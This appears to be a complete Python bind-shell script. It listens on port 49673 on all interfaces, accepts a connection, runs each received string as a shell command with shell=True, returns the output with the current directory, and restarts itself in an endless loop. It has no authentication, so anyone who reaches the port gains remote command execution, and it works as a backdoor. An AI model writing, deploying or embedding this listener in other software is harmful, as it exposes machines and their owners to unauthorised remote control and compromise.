import socket
import subprocess

# Server configuration
SERVER = '0.0.0.0'  # Listen on all network interfaces
PORT = 49673

def start_server():
    output = ""
    sent_output = ""
    output2 = ""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((SERVER, PORT))
        server_socket.listen(1)
        print(f"Server is listening on {SERVER}:{PORT}")

        connection, addr = server_socket.accept()
        print(f"Connected by {addr}")

        try:
            while True:
                # Receive command from client
                command = connection.recv(1024).decode()
                print(f"Debug:Executing command: {command}")
                if command.lower() == "exit":
                    print("Connection closed by client.")
                    break
                    
                # Execute the command and capture its output
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                result = subprocess.run("cd", shell=True, capture_output=True, text=True)
                output2 = result.stdout if result.stdout else result.stderr
                sent_output = output + "\n" + "Shell ~ " + output2
                # Send the output back to the client
                connection.sendall(sent_output.encode())
                #except socket.timeout:
                    #print("No command received within timeout. Waiting for input...")
                    #continue
                # Keep waiting instead of disconnecting

        except Exception as e:
            print(f"Error: {e}")
        finally:
            connection.close()
while True:
    start_server()